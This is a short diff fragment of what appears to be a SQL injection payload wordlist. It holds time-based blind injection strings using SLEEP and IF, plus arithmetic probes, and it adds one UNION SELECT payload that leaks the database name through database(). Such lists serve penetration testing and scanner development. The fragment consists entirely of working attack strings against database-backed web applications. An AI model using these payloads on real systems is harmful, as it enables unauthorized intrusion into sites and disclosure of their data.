@@ -22,6 +22,7 @@ AND (SELECT 1234 FROM (SELECT(SLEEP(5)))a)
 11820*if(now()=sysdate(),sleep(6),0)
 1;SELECT IF((8303>8302),SLEEP(9),2356)#  
 1*sleep(5)
+9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-
 1005*1 
 1005+123-118-5
 1005/1
